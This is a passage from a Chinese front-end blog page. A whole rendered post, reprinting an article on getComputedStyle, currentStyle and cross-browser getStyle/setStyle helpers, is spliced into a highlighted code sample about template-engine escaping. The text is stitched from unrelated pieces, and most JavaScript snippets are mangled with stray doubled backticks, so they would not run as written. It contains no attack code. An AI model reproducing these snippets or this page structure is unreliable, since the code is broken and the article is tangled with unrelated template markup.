          <span class="nx">o</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">t</span><span class="p">),</span>
          <span class="nx">s</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="nx">t</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
      <span class="nx">o</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">u</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span> <span class="nx">o</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="nx">c</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span> <span class="p">},</span> <span class="kc">false</span><span class="p">);</span> <span class="p">}</span>
      <span class="nx">s</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="c">&lt;!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ --&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="k">async</span><span class="p">(</span><span class="dl">"</span><span class="s2">//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span>
        <span class="c1">// BY Fix:去除标题前的‘#’ issues:</span><span class="o">&lt;</span><span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/qiubaiying/qiubaiying.github.io/issues/137&gt;</span>
        <span class="c1">// anchors.options = {</span>
        <span class="c1">//   visible: 'always',</span>
        <span class="c1">//   placement: 'right',</span>
        <span class="c1">//   icon: '#'</span>
        <span class="c1">// };</span>
        <span class="nx">anchors</span><span class="p">.</span><span class="nx">add</span><span class="p">().</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.intro-header h1</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.subheading</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.sidebar-container h5</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">})</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;style&gt;</span>
    <span class="c">/* place left on bigger screen */</span>
    <span class="k">@media</span> <span class="n">all</span> <span class="n">and</span> <span class="p">(</span><span class="n">min-width</span><span class="p">:</span> <span class="m">800px</span><span class="p">)</span> <span class="p">{</span>
        <span class="nc">.anchorjs-link</span><span class="p">{</span>
            <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
            <span class="nl">left</span><span class="p">:</span> <span class="m">-0.75em</span><span class="p">;</span>
            <span class="nl">font-size</span><span class="p">:</span> <span class="m">1.1em</span><span class="p">;</span>
            <span class="nl">margin-top</span> <span class="p">:</span> <span class="m">-0.1em</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/a&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>模板引擎经过解析后，得知三个插入点所处的上下文，自动选用相应的转义规则：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">""</span><span class="nt">&gt;</span><span class="c">&lt;!-- Image to hack wechat --&gt;</span>
<span class="c">&lt;!-- &lt;img src="/img/icon_wechat.png" width="0" height="0"&gt; --&gt;</span>
<span class="c">&lt;!-- &lt;img src="/https://cdn.jsdelivr.net/gh/tian-guo-guo/cdn@1.0/assets/img/home-bg-art.jpg" width="0" height="0"&gt; --&gt;</span>

<span class="c">&lt;!-- Post Header --&gt;</span>
<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
    <span class="nt">header</span><span class="nc">.intro-header</span><span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span>
        <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url('https://cdn.jsdelivr.net/gh/tian-guo-guo/cdn@1.0/assets/img/home-bg-art.jpg')</span>
    <span class="p">}</span>

    
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"intro-header"</span> <span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header-mask"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"post-heading"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tags"</span><span class="nt">&gt;</span>
                        
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"tag"</span> <span class="na">href=</span><span class="s">"/tags/#前端"</span> <span class="na">title=</span><span class="s">"前端"</span><span class="nt">&gt;</span>前端<span class="nt">&lt;/a&gt;</span>
                        
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"tag"</span> <span class="na">href=</span><span class="s">"/tags/#面试"</span> <span class="na">title=</span><span class="s">"面试"</span><span class="nt">&gt;</span>面试<span class="nt">&lt;/a&gt;</span>
                        
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;h1&gt;</span>【CSS进阶】原生JS getComputedStyle等方法解析<span class="nt">&lt;/h1&gt;</span>
                    
                    
                    <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"subheading"</span><span class="nt">&gt;</span>【CSS进阶】原生JS getComputedStyle等方法解析<span class="nt">&lt;/h2&gt;</span>
                    
                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"meta"</span><span class="nt">&gt;</span>Posted by 甜果果 on October 12, 2020<span class="nt">&lt;/span&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/header&gt;</span>

<span class="c">&lt;!-- Post Content --&gt;</span>
<span class="nt">&lt;article&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>

    <span class="c">&lt;!-- Post Container --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container"</span><span class="nt">&gt;</span>

				<span class="nt">&lt;h1</span> <span class="na">id=</span><span class="s">"css进阶原生js-getcomputedstyle等方法解析"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://www.cnblogs.com/coco1s/p/5210667.html"</span><span class="nt">&gt;</span>【CSS进阶】原生JS getComputedStyle等方法解析<span class="nt">&lt;/a&gt;&lt;/h1&gt;</span>

<span class="nt">&lt;p&gt;</span>本文讲的是原生 JS 获取、设置元素最终样式的方法。可能平时框架使用习惯了，以 jQuery 为例，使用 .css() 接口就能便捷的满足我们的要求。再看看今天要讲的 window.getComputedStyle ，就像刚接触 JS 的时候，看到 document.getElementById  一样，名字都这么长，顿生怯意。不过莫慌，我觉得如果我们不是只想做一个混饭吃的前端，那么越是底层的东西，如果能够吃透它，越是能让人进步。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>getComputedStyle 与<span class="nt">&lt;/strong&gt;</span> <span class="nt">&lt;strong&gt;</span>getPropertyValue<span class="nt">&lt;/strong&gt;</span> **
**<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>getComputedStyle 为何物呢，DOM 中 getComputedStyle 方法可用来获取元素中所有可用的css属性列表，以数组形式返回，并且是只读的。IE678 中则用 currentStyle 代替 。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>假设我们页面上存在一个 id 为 id 的元素，那么使用 getComputedStyle 获取元素样式就如下图所示：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://images2015.cnblogs.com/blog/608782/201602/608782-20160223180051740-242127492.png"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// 语法：``// 在旧版本之前，第二个参数“伪类”是必需的，现代浏览器已经不是必需参数了``// 如果不是伪类，设置为null，``window.getComputedStyle(``"元素"``, ``"伪类"``);
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>尝试一下之后可以看到，window.getComputedStyle 获取的是所有的样式，如果我们只是要获取单一样式，该怎么做呢。这个时候就要介绍另一个方法 – getPropertyValue 。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>用法也很简单：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// 语法：``// 使用 getPropertyValue 来指定获取的属性``window.getComputedStyle(``"元素"``, ``"伪类"``).getPropertyValue(style);
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"ie-下的-currentstyle-与-getattribute"</span><span class="nt">&gt;&lt;strong&gt;</span>IE 下的 currentStyle 与 getAttribute<span class="nt">&lt;/strong&gt;&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>说完常规浏览器，再来谈谈老朋友 IE ，与 getComputedStyle 对应，在 IE 中有自己特有的 currentStyle 属性，与 getPropertyValue 对应，IE 中使用 getAttribute 。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>和 getComputedStyle 方法不同的是，currentStyle 要获得属性名的话必须采用驼峰式的写法。也就是如果我需要获取 font-size 属性，那么传入的参数应该是 fontSize。因此在IE 中要获得单个属性的值，就必须将属性名转为驼峰形式。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// IE 下语法：``// IE 下将 CSS 命名转换为驼峰表示法``// font-size --<span class="ni">&amp;gt;</span> fontSize``// 利用正则处理一下就可以了``function` `camelize(attr) {``  ``// /\-(\w)/g 正则内的 (\w) 是一个捕获，捕获的内容对应后面 function 的 letter``  ``// 意思是将 匹配到的 -x 结构的 x 转换为大写的 X (x 这里代表任意字母)``  ``return` `attr.replace(/\-(\w)/g, ``function``(all, letter) {``    ``return` `letter.toUpperCase();``  ``});``}``// 使用 currentStyle.getAttribute 获取元素 element 的 style 属性样式``element.currentStyle.getAttribute(camelize(style));
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"style-与-getcomputedstyle"</span><span class="nt">&gt;&lt;strong&gt;</span>style 与 getComputedStyle<span class="nt">&lt;/strong&gt;&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>必须要提出的是，我们使用 element.style 也可以获取元素的CSS样式声明对象，但是其与 getComputedStyle 方法还是有一些差异的。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>首先，element.style 是可读可写的，而 getComputedStyle  为只读。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>其次，element.style 只可以获取 style 样式上的属性值，而无法得到所有的 CSS 样式值，什么意思呢？回顾一下 CSS 基础，CSS 样式表的表现有三种方式，<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ol&gt;</span>
  <span class="nt">&lt;li&gt;&lt;strong&gt;</span>内嵌样式（inline Style）<span class="nt">&lt;/strong&gt;</span> ：是写在 HTML 标签里面的，内嵌样式只对该标签有效。<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;strong&gt;</span>内部样式（internal Style Sheet）<span class="nt">&lt;/strong&gt;</span>：是写在 HTML 的 <span class="nt">&lt;style&gt;</span> <span class="err">标签里面的，内部样式只对所在的网页有效。</span><span class="nt">&lt;/style&gt;&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;&lt;strong&gt;</span>外部样式表（External Style Sheet）<span class="nt">&lt;/strong&gt;</span>：如果很多网页需要用到同样的样式(Styles)，将样式(Styles)写在一个以 .CSS 为后缀的 CSS 文件里，然后在每个需要用到这些样式(Styles)的网页里引用这个 CSS 文件。<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ol&gt;</span>

<span class="nt">&lt;p&gt;</span>而 element.style 只能获取被这些样式表定义了的样式，而 getComputedStyle 能获取到所有样式的值（在不同浏览器结果不一样，chrome 中是 264，在 Firefox 中是238），不管是否定义在样式表中，譬如：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span><span class="ni">&amp;lt;</span>style<span class="ni">&amp;gt;</span>``#id{``  ``width : 100px;``  ``float:left;``}``<span class="ni">&amp;lt;</span>/style<span class="ni">&amp;gt;</span>` `var` `elem = document.getElementById(``'id'``);` `elem.style.length ``// 2``window.getComputedStyle(elem, ``null``).length ``// 264
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"getcomputedstyle-与-defaultview"</span><span class="nt">&gt;&lt;strong&gt;&lt;em&gt;</span>*getComputedStyle 与*<span class="nt">&lt;/em&gt;</span> defaultView<span class="nt">&lt;/strong&gt;&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>window.getComputedStyle 还有另一种写法，就是 document.defaultView.getComputedStyle 。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>两者的用法完全一样，在 jQuery v1.10.2 中，使用的就是 window.getComputedStyle 。如下<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://images2015.cnblogs.com/blog/608782/201602/608782-20160223194555927-1671542584.jpg"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>也有特例，查看 <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://stackoverflow.com/questions/8136501/whats-the-difference-bewteen-document-defaultview-getcomputedstyle-and-window-g"</span><span class="nt">&gt;</span>stackoverflow<span class="nt">&lt;/a&gt;</span> ，上面提及到在 Firefox 3.6 ，不使用 document.defaultView.getComputedStyle 会出错。不过毕竟 FF3.6 已经随历史远去，现在可以放心的使用 window.getComputedStyle。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>用一张图总结一下：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://images2015.cnblogs.com/blog/608782/201602/608782-20160223194857161-884067652.png"</span> <span class="na">alt=</span><span class="s">"原生JS获取CSS样式的方法"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"原生js实现css样式的get与set"</span><span class="nt">&gt;&lt;strong&gt;</span>原生JS实现CSS样式的get与set<span class="nt">&lt;/strong&gt;&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>说了这么多，接下来将用原生 JS 实现一个小组件，实现 CSS 的 get 与 set，兼容所有浏览器。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>完整的组件代码在我的 github 上，<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://github.com/chokcoco/cssControl/blob/master/cssControl.1.0.0.js"</span><span class="nt">&gt;</span>戳我直接看代码<span class="nt">&lt;/a&gt;</span>。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"getstyleelem-style"</span><span class="nt">&gt;&lt;strong&gt;</span>getStyle(elem, style)<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>对于 CSS 的 set ，对于支持 window.getComputedStyle 的浏览器而言十分简单，只需要直接调用。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>getStyle: ``function``(elem, style) {``  ``// 主流浏览器``  ``if` `(win.getComputedStyle) {``    ``return` `win.getComputedStyle(elem, ``null``).getPropertyValue(style);``  ``}``}
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>反之，如果是 IE 浏览器，则有一些坑。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"opacity-透明度的设定"</span><span class="nt">&gt;&lt;strong&gt;</span>opacity 透明度的设定<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>在早期的 IE 中要设置透明度的话，有两个方法：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ol&gt;</span>
  <span class="nt">&lt;li&gt;</span>alpha(opacity=0.5)<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>filter:progid:DXImageTransform.Microsoft.gradient( GradientType= 0 , startColorstr = ‘#ccccc’, endColorstr = ‘#ddddd’ );<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ol&gt;</span>

<span class="nt">&lt;p&gt;</span>因此在 IE 环境下，我们需要针对透明度做一些处理。先写一个 IE 下获取透明度的方法：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// IE 下获取透明度  ``function` `getIEOpacity(elem) {``  ``var` `filter = ``null``;` `  ``// 早期的 IE 中要设置透明度有两个方法：``  ``// 1、alpha(opacity=0)``  ``// 2、filter:progid:DXImageTransform.Microsoft.gradient( GradientType= 0 , startColorstr = ‘#ccccc’, endColorstr = ‘#ddddd’ );``  ``// 利用正则匹配``  ``filter = elem.style.filter.match(/progid:DXImageTransform.Microsoft.Alpha\(.?opacity=(.*).?\)/i) || elem.style.filter.match(/alpha\(opacity=(.*)\)/i);` `  ``if` `(filter) {``    ``var` `value = parseFloat(filter);``    ``if` `(!isNaN(value)) {``      ``// 转化为标准结果``      ``return` `value ? value / 100 : 0;``    ``}``  ``}``  ``// 透明度的值默认返回 1``  ``return` `1;``}
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"float-样式的获取"</span><span class="nt">&gt;&lt;strong&gt;</span>float 样式的获取<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>float 属性是比较重要的一个属性，但是由于 float 是 ECMAScript 的一个保留字。（<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"http://www.w3school.com.cn/js/pro_js_reservedwords.asp"</span><span class="nt">&gt;</span>ECMAScript保留字有哪些？戳这里<span class="nt">&lt;/a&gt;</span>）<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>所以在各浏览器中都会有代替的写法，比如说在标准浏览器中为 cssFloat，而在 IE678 中为 styleFloat 。经测试，在标准浏览器中直接使用 getPropertyValue(“float”) 也可以获取到 float 的值。而 IE678 则不行，所以针对 float ，也需要一个 HACK。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"width--height-样式的获取"</span><span class="nt">&gt;&lt;strong&gt;</span>width | height 样式的获取<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;table&gt;</span>
  <span class="nt">&lt;tbody&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>然后是元素的高宽，对于一个没有设定高宽的元素而言，在 IE678 下使用 getPropertyValue(“width<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>height”) 得到的是 auto 。而标准浏览器会直接返回它的 px 值，当然我们希望在 IE 下也返回 px 值。<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/tbody&gt;</span>
<span class="nt">&lt;/table&gt;</span>

<span class="nt">&lt;p&gt;</span>这里的 HACK 方法是使用 element.getBoundingClientRect() 方法。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>element.getBoundingClientRect() –<span class="nt">&lt;/strong&gt;</span> 可以获得元素四个点相对于文档视图左上角的值 top、left、bottom、right ，通过计算就可以容易地获得准确的元素大小。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"获取样式的驼峰表示法"</span><span class="nt">&gt;&lt;strong&gt;</span>获取样式的驼峰表示法<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>上文已经提及了，在IE下使用 currentStyle 要获得属性名的话必须采用驼峰式的写法。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>OK，需要 HACK 的点已经提完了。那么在 IE 下，获取样式的写法：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>getStyle: ``function``(elem, style) {``  ``// 主流浏览器``  ``if` `(win.getComputedStyle) {``    ``...``  ``// 不支持 getComputedStyle``  ``} ``else` `{``    ``// IE 下获取透明度``    ``if` `(style == ``"opacity"``) {``      ``getIEOpacity(elem);``    ``// IE687 下获取浮动使用 styleFloat``    ``} ``else` `if` `(style == ``"float"``) {``      ``return` `elem.currentStyle.getAttribute(``"styleFloat"``);``        ``// 取高宽使用 getBoundingClientRect``    ``} ``else` `if` `((style == ``"width"` `|| style == ``"height"``) <span class="ni">&amp;amp;&amp;amp;</span> (elem.currentStyle[style] == ``"auto"``)) {``      ``var` `clientRect = elem.getBoundingClientRect();` `      ``return` `(style == ``"width"` `? clientRect.right - clientRect.left : clientRect.bottom - clientRect.top) + ``"px"``;``    ``}``    ``// 其他样式，无需特殊处理``    ``return` `elem.currentStyle.getAttribute(camelize(style));``  ``}``}
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"setstyleelem-style-value"</span><span class="nt">&gt;&lt;strong&gt;</span>set<span class="nt">&lt;/strong&gt;&lt;strong&gt;</span>Style(elem, style, value)<span class="nt">&lt;/strong&gt;&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>说完 get ，再说说 setStyle ，相较于getStyle ，setStyle 则便捷很多，因为不管是标准浏览器还是 IE ，都可以使用 element.style.cssText 对元素进行样式的设置。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>cssText –<span class="nt">&lt;/strong&gt;</span> 一种设置 CSS 样式的方法，但是它是一个销毁原样式并重建的过程，这种销毁和重建，会增加浏览器的开销。而且在 IE 中，如果 cssText（假如不为空)，最后一个分号会被删掉，所以我们需要在其中添加的属性前加上一个 ”;”  。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>只是在 IE 下的 opacity 需要额外的进行处理。明了易懂，直接贴代码：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// 设置样式``setStyle: ``function``(elem, style, value) {``  ``// 如果是设置 opacity ，需要特殊处理``  ``if` `(style == ``"opacity"``) {``    ``//IE7 bug:filter 滤镜要求 hasLayout=true 方可执行（否则没有效果）``    ``if` `(!elem.currentStyle || !elem.currentStyle.hasLayout) {``      ``// 设置 hasLayout=true 的一种方法``      ``elem.style.zoom = 1;``    ``}``    ``// IE678 设置透明度叫 filter ，不是 opacity``    ``style = ``"filter"``;` `    ``// !!转换为 boolean 类型进行判断``    ``if` `(!!window.XDomainRequest) {``      ``value = ``"progid:DXImageTransform.Microsoft.Alpha(style=0,opacity="` `+ value * 100 + ``")"``;``    ``} ``else` `{``      ``value = ``"alpha(opacity="` `+ value * 100 + ``")"``    ``}``  ``}``  ``// 通用方法``  ``elem.style.cssText += ``';'` `+ (style + ``":"` `+ value);``}
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>到这里，原生 JS 实现的 getStyle 与 setStyle 就实现了，<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://github.com/chokcoco/cssControl/blob/master/cssControl.1.0.0.js"</span><span class="nt">&gt;</span>完整的代码可以戳这里查看<span class="nt">&lt;/a&gt;</span>。可以看到，一个简单接口的背后，都是有涉及了很多方面东西。虽然浏览器兼容性是一个坑，但是爬坑的过程却是我们沉淀自己的最好时机。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>jQuery 这样的框架可以帮助我们走的更快，但是毫无疑问，去弄清底层实现，掌握原生 JS 的写法，可以让我们走得更远。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>原创文章，文笔有限，才疏学浅，文中若有不正之处，万望告知。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>如果本文对你有帮助，请点下推荐，写文章不容易。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>最后，本文组件示例的代码贴在 <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://github.com/chokcoco/cssControl"</span><span class="nt">&gt;</span>我的github<span class="nt">&lt;/a&gt;</span> 上。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>我在 github 上关于 jQuery 源码的全文注解，感兴趣的可以围观一下。<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://github.com/chokcoco/jQuery-"</span><span class="nt">&gt;</span>jQuery v1.10.2 源码注解 <span class="nt">&lt;/a&gt;</span>。<span class="nt">&lt;/p&gt;</span>


                <span class="nt">&lt;hr</span> <span class="na">style=</span><span class="s">"visibility: hidden;"</span><span class="nt">&gt;</span>

                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"pager"</span><span class="nt">&gt;</span>
                    
                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"previous"</span><span class="nt">&gt;</span>
